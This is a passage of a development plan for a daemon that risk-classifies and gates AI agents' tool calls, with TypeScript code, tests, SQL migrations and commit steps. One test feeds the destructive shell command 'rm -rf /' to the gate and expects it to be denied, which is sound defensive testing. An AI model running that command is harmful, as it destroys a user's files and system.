    expect(resolvePermissionDecision(ctx(), "s", { toolName: "Bash", toolInput: { command: "rm -rf /" }, toolUseId: "u3" })).toBe("deny");
  });
  it("denies an unknown session (fail-closed)", () => {
    expect(resolvePermissionDecision(ctx(), "nope", { toolName: "Read", toolInput: {}, toolUseId: "u4" })).toBe("deny");
  });
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `pnpm --filter @orca/daemon test -- server.permission-gate`
Expected: FAIL — `permission-gate.js` not found.

- [ ] **Step 3: Extract the decision into a testable helper**

Create `apps/daemon/src/permission-gate.ts`:

```ts
import type Database from "better-sqlite3";
import type { EventBus } from "./events.js";
import { classifyToolAction } from "./harness-risk/classify.js";
import { decideGate } from "./harness-risk/gate-decision.js";
import { recordHarnessTransition } from "./harness-transitions/usecases.js";
import type { GateDecision, OperatingMode } from "@orca/contracts";

export interface PermissionGateCtx {
  db: Database.Database;
  bus: EventBus;
  now?: () => string;
  idFactory?: () => string;
}

// Pure-ish decision: classify, read the goal's mode, decide, and record a tool_gate
// transition carrying the RiskFacet. Returns the gate decision; the caller maps
// "allow"/"deny" to an immediate hook response and "require_approval" to the
// existing record-and-wait flow. Fail-closed: unknown session/goal → "deny".
export function resolvePermissionDecision(
  ctx: PermissionGateCtx,
  sessionId: string,
  payload: { toolName: string; toolInput: unknown; toolUseId: string }
): GateDecision {
  const sessionRow = ctx.db.prepare("SELECT goal_id FROM sessions WHERE id = ?").get(sessionId) as { goal_id: string } | undefined;
  if (!sessionRow) return "deny";
  const goalRow = ctx.db.prepare("SELECT operating_mode FROM goals WHERE id = ?").get(sessionRow.goal_id) as { operating_mode: string } | undefined;
  if (!goalRow) return "deny";
  const mode = goalRow.operating_mode as OperatingMode;

  const classification = classifyToolAction({ toolName: payload.toolName, toolInput: payload.toolInput });
  const gateDecision = decideGate(mode, classification);

  try {
    recordHarnessTransition(
      { db: ctx.db, bus: ctx.bus, now: ctx.now, idFactory: ctx.idFactory },
      {
        goalId: sessionRow.goal_id,
        boundary: "tool_gate",
        risk: {
          risk_class: classification.riskClass,
          permission_tier: classification.permissionTier,
          classification_reasons: classification.reasons,
          gate_decision: gateDecision,
          hard_constraint_violations: classification.hardConstraintViolations,
          mode,
        },
      }
    );
  } catch (err) {
    console.error("recordHarnessTransition (tool_gate) failed", err);
  }
  return gateDecision;
}
```

- [ ] **Step 4: Run the helper test to verify it passes**

Run: `pnpm --filter @orca/daemon test -- server.permission-gate`
Expected: PASS (4 tests).

- [ ] **Step 5: Rewire `onPermissionRequest` in `server.ts` to use the helper**

In `apps/daemon/src/server.ts` `onPermissionRequest` (verbatim body at server.ts:1492-1535), REPLACE the early decision logic — the lines that compute `worker_permission_mode` and `return "deny"/"allow"` — with a call to the helper, keeping the existing record-and-wait flow only for `require_approval`:

```ts
    onPermissionRequest: async (sessionId, payload) => {
      const decision = resolvePermissionDecision(
        { db, bus: eventBus, now: daemonContext.now, idFactory: daemonContext.idFactory },
        sessionId,
        payload
      );
      if (decision === "allow") return "allow";
      if (decision === "deny") return "deny";
      // require_approval → the existing record-and-wait flow (unchanged below):
      const sessionRow = db.prepare("SELECT goal_id FROM sessions WHERE id = ?").get(sessionId) as { goal_id: string } | undefined;
      if (!sessionRow) return "deny";
      const goalId = sessionRow.goal_id;
      const summary = summarizePermission(payload.toolName, payload.toolInput);
      const { approvalId, answered, isNew } = permissionApprovals.record({
        toolUseId: payload.toolUseId, sessionId, goalId,
        toolName: payload.toolName, summary, toolInput: payload.toolInput,
      });
      // ... KEEP the existing `if (isNew) { insertMessageWithEvent(... pendingApproval ...) }`
      // block, the activity ping, and the Promise.race timeout exactly as they are today ...
      let timerId: ReturnType<typeof setTimeout>;
      const timed = new Promise<"deny">((res) => { timerId = setTimeout(() => res("deny"), PERMISSION_DECISION_TIMEOUT_MS); });
      const result = await Promise.race([answered, timed]);
      clearTimeout(timerId!);
      permissionApprovals.resolveDecision(approvalId, result);
      return result;
    },
```

Add the import `import { resolvePermissionDecision } from "./permission-gate.js";`. The helper now owns classification + transition recording; the inline flow only handles the held approval.

- [ ] **Step 6: Verify + commit**

Run: `pnpm --filter @orca/daemon test -- server.permission-gate harness-transitions && pnpm --filter @orca/daemon typecheck`. Then the broader server tests if present: `pnpm --filter @orca/daemon test -- http-surface` (re-run in isolation if it flakes).

```bash
git add apps/daemon/src/permission-gate.ts apps/daemon/src/server.permission-gate.test.ts apps/daemon/src/server.ts
git commit -m "feat(daemon): risk-classified per-tool gate driven by operating_mode + safety floor"
```

**End of Phase 3a.** Every tool request is now classified, recorded as a `tool_gate` transition, and gated by the per-goal mode + the non-disableable floor.

---

# Phase 3b — Unify step progression + accountability + activate risk_rule

### Task 6: Per-goal operating_mode drives step progression (supersede global SupervisionMode)

**Files:**
- Modify: `apps/daemon/src/workflows/orchestrator/service.ts`
- Test: extend `apps/daemon/src/workflows/orchestrator/service.agent-step.test.ts`

**Interfaces:**
- Consumes: the goal's `operating_mode`.
- Produces: the two `getSupervisionMode(db) === "supervised"` reads (service.ts:1647 and :3748) become per-goal: a step pauses for confirmation when its goal's `operating_mode === "human_review"`, and auto-advances when `automated`. A small helper `goalRequiresHumanReview(db, goalId): boolean` replaces the global read.

- [ ] **Step 1: Write the failing test**

Add to `service.agent-step.test.ts` (it already constructs runs via `setupAgentStepRun`/`seedWorkspace`/`seedAgentSession`/`makeJudgeService`):

```ts
it("auto-advances a completed step when the goal is automated (not global supervision)", async () => {
  const { db, bus, idFactory } = setupHarness();
  setupAgentStepRun(db, { guardrailsJson: "[]" });
  seedWorkspace(db);
  seedAgentSession(db);
  db.prepare("UPDATE goals SET operating_mode = 'automated' WHERE id = 'goal-1'").run();
  // Global supervision is left at its default ('supervised') to prove per-goal wins:
  const deliver = vi.fn(async () => "delivered" as const);
  const service = makeJudgeService(fakeMediator({ kind: "approve_step_complete" }), deliver);
  const responseText = "Done.\n```orca:step-complete\n" + JSON.stringify({ result: "implemented" }) + "\n```";
  await service.onAgentResponseDone(db, () => NOW, { sessionId: "sess-judge", adapterId: "claude-code", responseText }, { bus, idFactory });
  // automated → no pending_completion_json parked
  const row = db.prepare("SELECT pending_completion_json FROM workflow_step_runs WHERE id = 'step-1'").get() as { pending_completion_json: string | null };
  expect(row.pending_completion_json).toBeNull();
});

it("parks a completed step for confirmation when the goal is human_review", async () => {
  const { db, bus, idFactory } = setupHarness();
  setupAgentStepRun(db, { guardrailsJson: "[]" });
  seedWorkspace(db);
  seedAgentSession(db);
  db.prepare("UPDATE goals SET operating_mode = 'human_review' WHERE id = 'goal-1'").run();
  const deliver = vi.fn(async () => "delivered" as const);
  const service = makeJudgeService(fakeMediator({ kind: "approve_step_complete" }), deliver);
  const responseText = "Done.\n```orca:step-complete\n" + JSON.stringify({ result: "implemented" }) + "\n```";
  await service.onAgentResponseDone(db, () => NOW, { sessionId: "sess-judge", adapterId: "claude-code", responseText }, { bus, idFactory });
  const row = db.prepare("SELECT pending_completion_json FROM workflow_step_runs WHERE id = 'step-1'").get() as { pending_completion_json: string | null };
  expect(row.pending_completion_json).not.toBeNull();
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `pnpm --filter @orca/daemon test -- service.agent-step`
Expected: FAIL — today the decision uses the global `getSupervisionMode` (defaults to supervised), so the automated case still parks.

- [ ] **Step 3: Add the helper + replace the reads**

Add to `service.ts` (near the other small helpers):

```ts
function goalRequiresHumanReview(db: Database.Database, goalId: string): boolean {
  const row = db.prepare("SELECT operating_mode FROM goals WHERE id = ?").get(goalId) as { operating_mode: string } | undefined;
  // Fail-safe: unknown goal → require human review.
  return (row?.operating_mode ?? "human_review") === "human_review";
}
```

Replace the condition at service.ts:1647 — `if (getSupervisionMode(db) === "supervised" || ctx.stepTpl.completionPolicy === "handoff")` — with `if (goalRequiresHumanReview(db, ctx.run.goalId) || ctx.stepTpl.completionPolicy === "handoff")`.

Replace the condition at service.ts:3748 — `if (getSupervisionMode(db) === "supervised")` — with `if (goalRequiresHumanReview(db, <goalId in scope at that site>))`. (Determine the goal id available there — it's the run's goalId; use `run.goalId` / `ctx.run.goalId` per the surrounding code.)

> Leave `getSupervisionMode`/`setSupervisionMode` and the `/v1/settings` route in place (back-compat); they simply no longer drive step progression. `continueAllPausedSteps` is still triggered by the settings flip AND should now also be reachable when a goal flips to `automated` — wire the operating-mode PUT route (Task 4) to call `continueAllPausedSteps` for that goal's parked runs (mirror the settings route's call). Add to the PUT route: after the update, `if (parsed.data.operatingMode === "automated") await orchestratorService.continueAllPausedSteps(getDatabase(), daemonContext.now, { bus: eventBus, idFactory: daemonContext.idFactory });`.

- [ ] **Step 4: Run to verify it passes**

Run: `pnpm --filter @orca/daemon test -- service.agent-step`
Expected: PASS (the two new tests + existing). Then `pnpm --filter @orca/daemon typecheck`.

- [ ] **Step 5: Commit**

```bash
git add apps/daemon/src/workflows/orchestrator/service.ts apps/daemon/src/workflows/orchestrator/service.agent-step.test.ts apps/daemon/src/server.ts
git commit -m "feat(daemon): per-goal operating_mode drives step progression (supersede global supervision)"
```

---

### Task 7: Approval-count accountability + relaxation decision

**Files:**
- Create: `apps/daemon/migrations/0042_gate_approval_counts.sql`; modify `migrations.ts`
- Create: `apps/daemon/src/harness-risk/accountability.ts`
- Test: `apps/daemon/src/harness-risk/accountability.test.ts`
- Modify: `apps/daemon/src/server.ts` (resolve-approval route)

**Interfaces:**
- Produces: table `gate_approval_counts(goal_id, action_class, consecutive_approvals, last_decision, updated_at)`; `actionClassOf(toolName, classification): string`; `recordApprovalOutcome(ctx, { goalId, actionClass, decision }): { suggestRemember: boolean }` (increments on allow, resets on deny; `suggestRemember` true at ≥3); `recordRelaxationDecision(ctx, { goalId, actionClass }): string` (creates a `GoalDecision` and returns its id).

- [ ] **Step 1: Write the migration + failing test**

```sql
-- 0042_gate_approval_counts.sql
-- Per-goal, per-action-class approval streaks for executable accountability:
-- after N consecutive approvals with no rejection, the gate proactively offers
-- "always allow". A rejection resets the streak.
CREATE TABLE gate_approval_counts (
  goal_id               TEXT NOT NULL REFERENCES goals(id),
  action_class          TEXT NOT NULL,
  consecutive_approvals INTEGER NOT NULL DEFAULT 0,
  last_decision         TEXT NOT NULL,
  updated_at            TEXT NOT NULL,
  PRIMARY KEY (goal_id, action_class)
);
```

Register `"0042_gate_approval_counts.sql"` in `migrations.ts`.

```ts
// apps/daemon/src/harness-risk/accountability.test.ts
import { mkdtempSync, rmSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type Database from "better-sqlite3";
import type { Config } from "../config.js";
import { closeDatabase, openDatabase } from "../db.js";
import { defaultMigrationsDir, runMigrations } from "../migrations.js";
import { EventBus } from "../events.js";
import { actionClassOf, recordApprovalOutcome, resetPreparedStatements } from "./accountability.js";

const tempDirs: string[] = [];
function createConfig(d: string): Config {
  return { dataDir: d, port: 8787, logLevel: "silent", sessionOutputTailBytes: 1048576, sessionStopGraceMs: 5000,
    sessionWsBufferLimitBytes: 1048576, memoryExtractionMaxInputBytes: 131072, memoryExtractionTimeoutMs: 15000,
    hookResolverCommand: ["node","t.js"], getAuthToken: () => "t" };
}
function openTestDb(): Database.Database { const dir = mkdtempSync(path.join(os.tmpdir(), "orca-acct-")); tempDirs.push(dir); const db = openDatabase(createConfig(dir)); runMigrations(db, defaultMigrationsDir()); return db; }
function seedGoal(db: Database.Database) { const now = "2026-01-01T00:00:00.000Z"; db.prepare(`INSERT INTO goals (id,title,description,status,autonomy_level,created_at,updated_at,archived_at) VALUES ('g','x','','active',1,?,?,NULL)`).run(now, now); }
let db: Database.Database; let bus: EventBus;
beforeEach(() => { db = openTestDb(); bus = new EventBus(); seedGoal(db); });
afterEach(() => { closeDatabase(); resetPreparedStatements(); for (const d of tempDirs.splice(0)) rmSync(d, { recursive: true, force: true }); });
const ctx = () => ({ db, bus, now: () => "2026-05-01T00:00:00.000Z" });

describe("accountability", () => {
  it("derives a stable action class", () => {
    const a = actionClassOf("Bash", { riskClass: "high", permissionTier: "full_access", reasons: [], hardConstraintViolations: [] });
    expect(a).toBe("Bash:full_access");
  });
  it("suggests remember at the 3rd consecutive approval, resets on deny", () => {
    expect(recordApprovalOutcome(ctx(), { goalId: "g", actionClass: "Bash:full_access", decision: "allow" }).suggestRemember).toBe(false);
    expect(recordApprovalOutcome(ctx(), { goalId: "g", actionClass: "Bash:full_access", decision: "allow" }).suggestRemember).toBe(false);
    expect(recordApprovalOutcome(ctx(), { goalId: "g", actionClass: "Bash:full_access", decision: "allow" }).suggestRemember).toBe(true);
    recordApprovalOutcome(ctx(), { goalId: "g", actionClass: "Bash:full_access", decision: "deny" });
    expect(recordApprovalOutcome(ctx(), { goalId: "g", actionClass: "Bash:full_access", decision: "allow" }).suggestRemember).toBe(false);
  });
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `pnpm --filter @orca/daemon test -- harness-risk/accountability`
Expected: FAIL — module not found.

- [ ] **Step 3: Write the accountability module**

```ts
// apps/daemon/src/harness-risk/accountability.ts
import type Database from "better-sqlite3";
import type { EventBus } from "../events.js";
import type { Classification } from "./classify.js";
import { createDecision } from "../decisions/usecases.js";

const REMEMBER_THRESHOLD = 3; // mirrors the revise/retry caps convention

export interface AccountabilityCtx { db: Database.Database; bus: EventBus; now?: () => string; }

let _db: Database.Database | null = null;
let _stmts: { get: Database.Statement; upsert: Database.Statement } | null = null;
function ensure(db: Database.Database) {
  if (db !== _db) {
    _db = db;
    _stmts = {
      get: db.prepare("SELECT consecutive_approvals FROM gate_approval_counts WHERE goal_id = ? AND action_class = ?"),
      upsert: db.prepare(
        `INSERT INTO gate_approval_counts (goal_id, action_class, consecutive_approvals, last_decision, updated_at)
         VALUES (?, ?, ?, ?, ?)
         ON CONFLICT(goal_id, action_class) DO UPDATE SET consecutive_approvals = excluded.consecutive_approvals, last_decision = excluded.last_decision, updated_at = excluded.updated_at`
      ),
    };
  }
  return _stmts!;
}
export function resetPreparedStatements(): void { _db = null; _stmts = null; }

export function actionClassOf(toolName: string, c: Classification): string {
  return `${toolName}:${c.permissionTier}`;
}

export function recordApprovalOutcome(
  ctx: AccountabilityCtx,
  input: { goalId: string; actionClass: string; decision: "allow" | "deny" }
): { suggestRemember: boolean } {
  const now = ctx.now?.() ?? new Date().toISOString();
  const stmts = ensure(ctx.db);
  const row = stmts.get.get(input.goalId, input.actionClass) as { consecutive_approvals: number } | undefined;
  const prev = row?.consecutive_approvals ?? 0;
  const next = input.decision === "allow" ? prev + 1 : 0;
  stmts.upsert.run(input.goalId, input.actionClass, next, input.decision, now);
  return { suggestRemember: input.decision === "allow" && next >= REMEMBER_THRESHOLD };
}

// Records an auditable GoalDecision when a gate is relaxed (always-allow remembered).
export function recordRelaxationDecision(
  ctx: AccountabilityCtx,
  input: { goalId: string; actionClass: string }
): string {
  const decision = createDecision(
    { db: ctx.db, bus: ctx.bus, now: ctx.now },
    {
      goalId: input.goalId,
      title: `Gate relaxed: ${input.actionClass}`,
      decisionText: `Always-allow enabled for action class "${input.actionClass}" after repeated approvals.`,
      rationale: "User chose to remember this approval; future matching actions auto-allow per executable accountability.",
      status: "confirmed",
      confirmationRequired: false,
    }
  );
  return decision.id;
}
```

- [ ] **Step 4: Run to verify it passes**

Run: `pnpm --filter @orca/daemon test -- harness-risk/accountability`
Expected: PASS (2 tests).

- [ ] **Step 5: Wire into the resolve-approval route**

In `server.ts`'s `POST /v1/goals/:goalId/permission-approvals/:approvalId` (verbatim at server.ts:1642-1664): after resolving the decision, call `recordApprovalOutcome({ db, bus: eventBus, now: daemonContext.now }, { goalId, actionClass, decision: parsed.data.decision })` — derive `actionClass` by re-classifying the pending approval's `toolName`/`toolInput` (the `pending` object from `permissionApprovals.get(approvalId)` carries `toolName` + `toolInput`) via `actionClassOf(pending.toolName, classifyToolAction({ toolName: pending.toolName, toolInput: pending.toolInput }))`. When `parsed.data.decision === "allow" && parsed.data.remember`, ALSO call `recordRelaxationDecision(...)` alongside the existing `writePermissionRule` block. Imports: `classifyToolAction` and the two accountability functions.

> The `suggestRemember` signal is surfaced to the UI by setting `canRemember: true` on the pending-approval message; today `canRemember` comes from `supportsPermissionPersistence`. Extend it: `canRemember: supportsPermissionPersistence && (the latest recordApprovalOutcome.suggestRemember for this action class)` — i.e. only advertise remember once the streak threshold is hit. (Compute the streak via a read at message-creation time in `onPermissionRequest`'s `isNew` block.)

- [ ] **Step 6: Verify + commit**

Run: `pnpm --filter @orca/daemon test -- harness-risk/accountability && pnpm --filter @orca/daemon typecheck`. Update the migration-list snapshot tests for `0042` (append) and re-run `-- migrations`.

```bash
git add apps/daemon/migrations/0042_gate_approval_counts.sql apps/daemon/src/migrations.ts apps/daemon/src/harness-risk/accountability.ts apps/daemon/src/harness-risk/accountability.test.ts apps/daemon/src/server.ts apps/daemon/src/migrations.test.ts apps/daemon/src/workflows/__tests__/migrations-0006.test.ts apps/daemon/src/suggested-orchestration.test.ts
git commit -m "feat(daemon): approval-streak accountability + relaxation decision"
```

---

### Task 8: Activate the `risk_rule` guardrail at the launch chokepoint

**Files:**
- Modify: `apps/daemon/src/workflows/orchestrator/service.ts`
- Modify: `apps/daemon/src/workflows/orchestration-transport/human-review.ts`
- Test: extend `apps/daemon/src/workflows/guardrails/evaluator.test.ts` is already covered; add an integration assertion in `service.agent-step.test.ts`.

**Interfaces:**
- Produces: the two production `GuardrailContext` builders (service.ts:3041, human-review.ts:581) now populate `riskLabels` derived from the chosen operator's action risk, so a `risk_rule` guardrail can fire. For the launch action, `riskLabels` = the permission-tier + risk-class strings of the step's declared operation (use `["operator:<operatorId>"]` plus, when the step is an execution/code step, `["tier:sandbox_edit"]`). Minimal, deterministic.

- [ ] **Step 1: Write the failing test**

Add to `service.agent-step.test.ts` a case that attaches a `risk_rule` guardrail with `escalateOn: ["tier:full_access"]` and asserts that a launch whose classified risk includes `tier:full_access` routes to a recommendation (require_approval) rather than a direct launch. (Mirror the existing guardrail launch-chokepoint tests in that file; assert `recommendationCount(db, "launch_workflow_session")` or the equivalent the file already uses.)

> Because the exact launch-risk vocabulary is a design choice, scope this minimally: populate `riskLabels: ["operator:" + chosen.id]` at service.ts:3041 and `riskLabels: ["operator:" + normalizedSelection.operatorId]` at human-review.ts:581, and have the test use `escalateOn: ["operator:" + <the operator id the harness selects>]`. This proves the wiring end-to-end without inventing a risk taxonomy for workflow operators.

- [ ] **Step 2: Run to verify it fails**

Run: `pnpm --filter @orca/daemon test -- service.agent-step`
Expected: FAIL — `riskLabels` is currently never populated, so `risk_rule` always returns `allow` and the launch proceeds directly.

- [ ] **Step 3: Populate riskLabels at both builders**

At service.ts:3041, add `riskLabels: ["operator:" + chosen.id],` to the `GuardrailContext` object literal. At human-review.ts:581, add `riskLabels: ["operator:" + normalizedSelection.operatorId],` to the `guardCtx` object.

- [ ] **Step 4: Run to verify it passes**

Run: `pnpm --filter @orca/daemon test -- service.agent-step && pnpm --filter @orca/daemon typecheck`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add apps/daemon/src/workflows/orchestrator/service.ts apps/daemon/src/workflows/orchestration-transport/human-review.ts apps/daemon/src/workflows/orchestrator/service.agent-step.test.ts
git commit -m "feat(daemon): populate riskLabels at launch chokepoint (activate risk_rule guardrail)"
```

**End of Phase 3b.** One per-goal mode now governs both tool calls and step progression; repeated approvals build an auditable relaxation; the dormant `risk_rule` guardrail is live.

---

# Phase 3c — Containment

### Task 9: Close the antigravity permission-gate gap

**Files:**
- Modify: `apps/daemon/src/orchestrator-llm/providers/antigravity.ts`
- Test: `apps/daemon/src/orchestrator-llm/providers/antigravity.test.ts` (extend or create)

**Interfaces:**
- Consumes: the Codex `workerHookConfig` shape (`apps/daemon/src/orchestrator-llm/providers/codex.ts`) as the template.
- Produces: `antigravity.workerHookConfig(...)` returns a real hook config wiring a `PermissionRequest` hook to the daemon's `/v1/agent-hooks/permission` resolver (so antigravity workers are gated like Codex), instead of the current `{ files: [], spawnArgs: [] }` stub.

- [ ] **Step 1: Write the failing test**

```ts
// apps/daemon/src/orchestrator-llm/providers/antigravity.test.ts (add)
import { describe, expect, it } from "vitest";
import { antigravityShadowProvider } from "./antigravity.js"; // confirm the actual export name

describe("antigravity workerHookConfig", () => {
  it("wires a PermissionRequest hook (no longer a stub)", () => {
    const cfg = antigravityShadowProvider.workerHookConfig({
      goalId: "g", sessionId: "s", resolverCommand: ["node", "resolver.js"], configDir: "/tmp/cfg",
    });
    // Must produce at least one hook file referencing the permission resolver,
    // mirroring Codex (which writes a hooks.json with PermissionRequest).
    const serialized = JSON.stringify(cfg);
    expect(serialized).toContain("PermissionRequest");
    expect(cfg.files.length).toBeGreaterThan(0);
  });
});
```

> Confirm the real export name (`antigravityShadowProvider` vs default) and the exact `workerHookConfig` return type from `codex.ts`/`antigravity.ts` before writing; adapt the assertion to the real shape (it may return `{ files: [{path, contents}], spawnArgs: string[] }`).

- [ ] **Step 2: Run to verify it fails**

Run: `pnpm --filter @orca/daemon test -- antigravity`
Expected: FAIL — the stub returns no files / no PermissionRequest.

- [ ] **Step 3: Implement `workerHookConfig` mirroring Codex**

Replace the antigravity `workerHookConfig` stub (antigravity.ts:40-42) with an implementation that builds the same hook structure Codex's `buildCodexWorkerHookSettings` (codex.ts:199) produces — a hook file wiring `PermissionRequest` (and, if antigravity supports it, `PreToolUse`/elicit) to the resolver command. Reuse the daemon's hook-settings helper if one is shared; otherwise inline the structure from Codex. Keep `permissionRule`/`writePermissionRule` as no-ops if antigravity has no native always-allow file format (document that always-allow won't persist for antigravity, matching `supportsPermissionPersistence = false`).

> The exact file format is provider-specific. Implement it to match how the antigravity CLI consumes hooks (check the provider's existing `buildAntigravityHookSettings`/spawn flags). If the antigravity CLI's hook contract is unknown/undocumented in the repo, STOP and report NEEDS_CONTEXT rather than guessing a wire format — this is the one task most likely to need a human/source check.

- [ ] **Step 4: Run to verify it passes**

Run: `pnpm --filter @orca/daemon test -- antigravity && pnpm --filter @orca/daemon typecheck`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add apps/daemon/src/orchestrator-llm/providers/antigravity.ts apps/daemon/src/orchestrator-llm/providers/antigravity.test.ts
git commit -m "feat(daemon): wire antigravity PermissionRequest hook (close gate gap)"
```

---

### Task 10: `SpawnSandbox` seam

**Files:**
- Create: `apps/daemon/src/adapters/sandbox.ts`
- Test: `apps/daemon/src/adapters/sandbox.test.ts`
- Modify: `apps/daemon/src/adapters/types.ts`

**Interfaces:**
- Produces: `interface SpawnSandbox { wrap(spawn: ResolvedSpawn): ResolvedSpawn }`; `noopSandbox: SpawnSandbox` (identity); a documented seam in `buildSpawnEnv`/the spawn path where a future OS-containment implementation plugs in. No containment is implemented — this is the reserved interface only.

- [ ] **Step 1: Write the failing test**

```ts
// apps/daemon/src/adapters/sandbox.test.ts
import { describe, expect, it } from "vitest";
import { noopSandbox } from "./sandbox.js";

describe("noopSandbox", () => {
  it("returns the spawn unchanged (identity pass-through)", () => {
    const spawn = { command: "claude", args: [], env: { PATH: "/usr/bin" }, cwd: "/tmp/r" };
    expect(noopSandbox.wrap(spawn)).toEqual(spawn);
  });
});
```

> Confirm the real `ResolvedSpawn` shape from `adapters/types.ts` (the return type of `resolveSpawn`) and import it; adjust the test fixture to match (it is `{ command, args, env, cwd }` per recon).

- [ ] **Step 2: Run to verify it fails**

Run: `pnpm --filter @orca/daemon test -- adapters/sandbox`
Expected: FAIL — module not found.

- [ ] **Step 3: Write the seam**

```ts
// apps/daemon/src/adapters/sandbox.ts
import type { ResolvedSpawn } from "./types.js"; // confirm the exported type name

// Reserved seam for OS-level containment (namespaces/seccomp/sandbox-exec). A
// future milestone provides a real implementation that restricts the spawn's
// filesystem/network/credentials. Today the only implementation is the identity
// pass-through; the policy layer (risk classification + gate) is the active control.
export interface SpawnSandbox {
  wrap(spawn: ResolvedSpawn): ResolvedSpawn;
}

export const noopSandbox: SpawnSandbox = {
  wrap: (spawn) => spawn,
};
```

> If `adapters/types.ts` does not export a named `ResolvedSpawn` type, add one for the `resolveSpawn` return shape (`{ command: string; args: string[]; env: Record<string,string>; cwd: string }`) and use it; this is a minimal, additive type extraction.

- [ ] **Step 4: Thread the seam (no behavior change)**

In `adapters/types.ts` (or the single place spawns are materialized into a process), apply `noopSandbox.wrap(spawn)` to the resolved spawn before it is used, so the seam is a real call site (identity today). Add a one-line comment pointing to `sandbox.ts` as the containment extension point. Keep behavior identical.

- [ ] **Step 5: Run + commit**

Run: `pnpm --filter @orca/daemon test -- adapters/sandbox && pnpm --filter @orca/daemon typecheck`

```bash
git add apps/daemon/src/adapters/sandbox.ts apps/daemon/src/adapters/sandbox.test.ts apps/daemon/src/adapters/types.ts
git commit -m "feat(daemon): SpawnSandbox seam (identity; reserved for OS containment)"
```

**End of Phase 3c.** antigravity workers are gated; the containment seam is in place for a future milestone.

---

## Self-Review

**Spec coverage (against `2026-06-23-harness-axes-design.md` §4.2):**
- Risk classifier populating risk + permission tiers → Tasks 2, 5. ✓
- RiskFacet recorded on transitions → Tasks 1, 5 (`tool_gate`). ✓
- Permission tiers replace binary gate; two-mode operating model with the non-disableable floor → Tasks 3, 4, 5, 6. ✓
- Executable accountability (`policy_delta`) → Task 7. ✓
- Retire `autonomyLevel` → not actively removed (it's already dead); `operating_mode` supersedes it. The column is left in place (SQLite drop is messy); it is no longer surfaced as meaningful. Noted as a deliberate non-removal.
- antigravity gate + `SpawnSandbox` seam → Tasks 9, 10. ✓
- `risk_rule` activation → Task 8. ✓

**Placeholder scan:** Tasks 8, 9, 10 each carry an explicit "confirm the real shape / STOP if unknown" note rather than a fabricated wire format — these are integration points where the verbatim shape wasn't in the recon set (antigravity hook format, the exact `risk_rule` launch vocabulary, `ResolvedSpawn` type name). They are flagged for recon-first or NEEDS_CONTEXT, not silently guessed. Every other task ships complete code.

**Type consistency:** `RiskFacet` field names are identical across the contract (Task 1), the classifier→facet mapping (Task 5), and the gate (Task 3/5). `OperatingMode` is declared ONCE (in `harness/index.ts`, Task 1) and imported by `index.ts` (Task 4) to avoid a duplicate barrel export — explicitly called out. `RecordTransitionInput.risk` is aligned in the same task that tightens the contract (Task 1), applying the Phase-2 lesson. `actionClassOf` returns `"<tool>:<tier>"` consistently in Task 7's definition and its server wiring.

**Known recon-first tasks for execution:** Tasks 8, 9, 10 should get a focused recon (the `risk_rule` launch-context builders' exact surrounding code; the antigravity/Codex `workerHookConfig` return type + wire format; the `ResolvedSpawn` type name and the single spawn-materialization site) before dispatch — same recon-first discipline used for the Executable veto.
